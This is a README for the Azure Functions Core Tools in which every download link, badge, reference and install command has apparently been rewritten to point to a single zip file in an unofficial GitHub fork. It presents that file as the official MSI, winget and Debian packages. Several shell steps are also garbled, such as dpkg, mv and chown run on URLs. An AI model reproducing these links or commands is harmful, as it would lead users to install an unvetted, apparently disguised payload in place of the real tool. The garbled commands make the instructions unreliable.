![Azure Functions Logo](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip)

|Branch|Status|
|---|---|
|v4.x|[![Build status](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip%20Functions/_apis/build/status/azure-functions-core-tools?branchName=v4.x)](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip%20Functions/_build/latest?definitionId=11&branchName=v4.x)|
|v3.x|[![Build status](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip%20Functions/_apis/build/status/azure-functions-core-tools?branchName=v3.x)](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip%20Functions/_build/latest?definitionId=11&branchName=v3.x)|
|dev|[![Build Status](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip%20Functions/_apis/build/status/azure-functions-core-tools?branchName=dev)](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip%20Functions/_build/latest?definitionId=11&branchName=dev)
|v1.x|[![Build status](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip%20Functions/_apis/build/status/azure-functions-core-tools?branchName=v1.x)](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip%20Functions/_build/latest?definitionId=11&branchName=v1.x)|

# Azure Functions Core Tools

The Azure Functions Core Tools provide a local development experience for creating, developing, testing, running, and debugging Azure Functions.

## Versions

**v1** (v1.x branch): Requires .NET 4.7.1 Windows Only

**v2** (dev branch): Self-contained cross-platform package

**v3**: (v3.x branch): Self-contained cross-platform package

**v4**: (v4.x branch): Self-contained cross-platform package **(recommended)**

## Installing

### Windows

#### To download and install with MSI:

##### v4

- [Windows 64-bit](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip) (VS Code debugging requires 64-bit)
- [Windows 32-bit](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip)

##### v3

- [Windows 64-bit](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip) (VS Code debugging requires 64-bit)
- [Windows 32-bit](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip)

#### To install with npm:

##### v4
```bash
npm i -g azure-functions-core-tools@4 --unsafe-perm true
```

##### v3
```bash
npm i -g azure-functions-core-tools@3 --unsafe-perm true
```

##### v2
```bash
npm i -g azure-functions-core-tools@2 --unsafe-perm true
```

#### To install with chocolatey:

##### v4
```bash
choco install azure-functions-core-tools
```

##### v3
```bash
choco install azure-functions-core-tools-3
```

*Notice: To debug functions under vscode, the 64-bit version is required*
```bash
choco install azure-functions-core-tools-3 --params "'/x64'"
```

##### v2
```bash
choco install azure-functions-core-tools-2
```

#### To install with winget:

##### v4

```bash
winget install https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip
```

##### v3

```bash
winget install https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip -v 3.0.3904
```

### Mac

#### Homebrew:

##### v4
    
```bash
brew tap azure/functions
brew install azure-functions-core-tools@4
```

##### v3
```bash
brew tap azure/functions
brew install azure-functions-core-tools@3
```

##### v2
```bash
brew tap azure/functions
brew install azure-functions-core-tools@2
```

Homebrew allows side by side installation of v2 and v3, you can switch between the versions using
```bash
brew link --overwrite azure-functions-core-tools@3
```


### Linux

#### 1. Set up package feed

##### Ubuntu 20.04

```bash
wget -q https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip
sudo dpkg -i https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip
```

##### Ubuntu 19.04

```bash
wget -q https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip
sudo dpkg -i https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip
```

##### Ubuntu 18.10

```bash
wget -q https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip
sudo dpkg -i https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip
```

##### Ubuntu 18.04

```bash
wget -q https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip
sudo dpkg -i https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip
```

##### Ubuntu 16.04 / Linux Mint 18

```bash
wget -q https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip
sudo dpkg -i https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip
```

##### Debian 9 / 10

```bash
# set to 9 or 10
DEBIAN_VERSION=10

wget -qO- https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip | gpg --dearmor > https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip
sudo mv https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip
wget -q https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip$https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip
sudo mv https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip
sudo chown root:root https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip
sudo chown root:root https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip
```

#### 2. Install

##### v4
```bash
sudo apt-get update
sudo apt-get install azure-functions-core-tools-4
```

##### v3
```bash
sudo apt-get update
sudo apt-get install azure-functions-core-tools-3
```

##### v2
```bash
sudo apt-get update
sudo apt-get install azure-functions-core-tools-2
```

#### Other Linux Distributions

1. Download latest release

    Download the latest release for your platform from [here](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip).

2. Unzip release zip

    Using your preferred tool, unzip the downloaded release. To unzip into an `azure-functions-cli` directory using the `unzip` tool, run this command from the directory containing the downloaded release zip:

    ```bash
    unzip -d azure-functions-cli https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip*.zip
    ```

3. Make the `func` command executable

    Zip files do not maintain the executable bit on binaries. So, you'll need to make the `func` binary, as well as `gozip` (used by func during packaging) executables. Assuming you used the instructions above to unzip:

    ```bash
    cd azure-functions-cli
    chmod +x func
    chmod +x gozip
    ./func
    ```

4. Optionally add `func` to your `$PATH`

    To execute the `func` command without specifying the full path to the binary, add its directory to your `$PATH` environment variable. Assuming you're still following along from above:

    ```bash
    export PATH=`pwd`:$PATH
    func
    ```

[Code and test Azure Functions locally](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip)

**NOTE**: npm can be used on all platforms. On unix platforms, you may need to specify `--unsafe-perm` if you are running npm with sudo. That's due to npm behavior of post install script.

## Getting Started on Kubernetes

Using the Core Tools, you can easily configure a Kubernetes cluster and run Azure Functions on it.

### Prerequisites

* [Docker](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip)
* [Kubectl](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip)

### Installing Kubernetes scalers

This deploys [KEDA](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip) to your cluster which allows you to deploy your functions in a scale-to-zero by default for non-http scenarios only.

```bash
func kubernetes install --namespace {namespace}
```

**KEDA:** Handles monitoring polling event sources currently QueueTrigger and ServiceBusTrigger.

### Deploy to Kubernetes

**First make sure you have Dockerfile for your project.** You can generate one using
```bash
func init --docker # or --docker-only (for existing projects)
```
Then to deploy to kubernetes

```bash
func kubernetes deploy \
    --name myfunction \
    --namespace functions-ns \
    --registry <docker-hub-id or registry-server>
```

This will build the current `Dockerfile` and push the image to the registry specified, then deploys a `Secret`, `Deployment`, and `ScaledObject`. If your functions have httpTrigger, you'll get an additional `Deployment` and `Service`.

### Deploy using a private registry

```bash
func kubernetes deploy --name myfunction --registry <docker-hub-id or registry-server> --pull-secret <registry auth secret>

```

### Deploy a function to Knative

#### Prerequisites

* [Knative](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip)

Deploying Azure Functions to knative is supported with the ```--platform knative``` flag.
The Core Tools CLI identifies non HTTP trigger functions and annotates the knative manifest with the the ```minScale``` annotation to opt out of scale-to-zero.

```bash
func deploy --platform knative --name myfunction --registry <docker-hub-id or registry-server>
```

### Deploying a function to AKS using ACR
Using the configuration options an Azure Function app can also be deployed to a [AKS](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip) (Azure Kubernetes Service) Kubernetes cluster and use [ACR](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip) as the registry server. Do all of the following *before* you run the deployment command.

#### Create a AKS cluster
You can create an AKS cluster using the [Azure Portal](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip) or using [Azure CLI](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip).

Once your AKS cluster is created make sure that you can access it using kubectl. To make kubectl run in the context of your cluster, configure a connection using the command below.
```azurecli
az aks get-credentials \
    --name FunctionsCluster \
    --resource-group <resource-group-name>
```

To verify the connection to your cluster run the following command
```bash
> kubectl get nodes

NAME                       STATUS    ROLES     AGE       VERSION
aks-agentpool-20257154-0   Ready     agent     1d        v1.11.5
aks-agentpool-20257154-1   Ready     agent     1d        v1.11.5
aks-agentpool-20257154-2   Ready     agent     1d        v1.11.5
```
#### Create a ACR Registry
An ACR instance can be created using the Azure Portal or the [Azure CLI](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip)

#### Login to the ACR Registry
Before pushing and pulling container images, you must log in to the ACR instance.

```azurecli
az acr login --name <acrName>
```

#### Give the AKS cluster access to the ACR Registry
The AKS cluster needs access to the ACR Registry to pull the container. Azure creates a service principal to support cluster operability with other Azure resources. This can be used for authentication with an ACR registry. See here for how to grant the right access here: [Authenticate with Azure Container Registry from Azure Kubernetes Service](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip)

#### Run the deployment
The deployment will build the docker container and upload the container image to your referenced ACR instance (Note: Specify the ACR Login Server in the --registry parameter this is usually of the form <container_registry_name>https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip) and then your AKS cluster will use that as a source to obtain the container and deploy it.

```bash
func kubernetes deploy --name myfunction --registry <acr-registry-loginserver>
```

If the deployment is successful, you should see this:

Function deployed successfully!
Function IP: 40.121.21.192

#### Verifying your deployment
You can verify your deployment by using the Kubernetes web dashboard. To start the Kubernetes dashboard, use the [az aks browse](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip) command.

```azurecli
az aks browse --resource-group myResourceGroup --name myAKSCluster
```
In the Kubernetes dashboard look for the namespace "azure-functions" and make sure that a pod has been deployed sucessfully with your container.

### Deploying Azure Functions with Virtual-Kubelet

Azure Functions running on Kubernetes can take advantage of true serverless containers model by getting deployed to different providers of [Virtual Kubelet](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip), such as Azure Container Instances.<br>

Functions deployed to Kubernetes already contain all the tolerations needed to be schedulable to Virtual Kubelet nodes.
All you need to do is to set up VKubelet on your Kubernetes cluster:

* [Install VKubelet with ACI](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip)

* [Install VKubelet with ACI on AKS](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip)

*Important note:*
Virtual Kubelet does not currently allow for Kubernetes Services to route external traffic to pods.
This means that HTTP triggered functions will not receive traffic running on a VKubelet provider (including ACI).

A good usage scenario for using functions with VKubelet would be with event triggered / time triggered functions that do not rely on external HTTP traffic.

## Known Issues:

`func extensions` command require the `dotnet` cli to be installed and on your path. This requirement is tracked [here](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip). You can install .NET Core for your platform from https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip

## Default Directories

* `CurrentDirectory`: is the default directory the functions runtime looks for functions in.
* `%TMP%\LogFiles\Application\Functions`: is the default directory for logs. It mirrors the logs directory on Azure as well.

## Telemetry

The Azure Functions Core tools collect usage data in order to help us improve your experience.
The data is anonymous and doesn't include any user specific or personal information. The data is collected by Microsoft.

You can opt-out of telemetry by setting the `FUNCTIONS_CORE_TOOLS_TELEMETRY_OPTOUT` environment variable to '1' or 'true' using your favorite shell.

[Microsoft privacy statement](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip)

## License

This project is under the benevolent umbrella of the [.NET Foundation](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip) and is licensed under [the MIT License](LICENSE)

This project has adopted the [Microsoft Open Source Code of Conduct](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip). For more information see the [Code of Conduct FAQ](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip) or contact [https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip) with any additional questions or comments.

## Contact Us

For questions on Azure Functions or the tools, you can ask questions here:

- [Azure Functions Q&A Forum](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip)
- [Azure-Functions tag on StackOverflow](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip)

File bugs at [Azure Functions Core Tools repo on GitHub](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip).
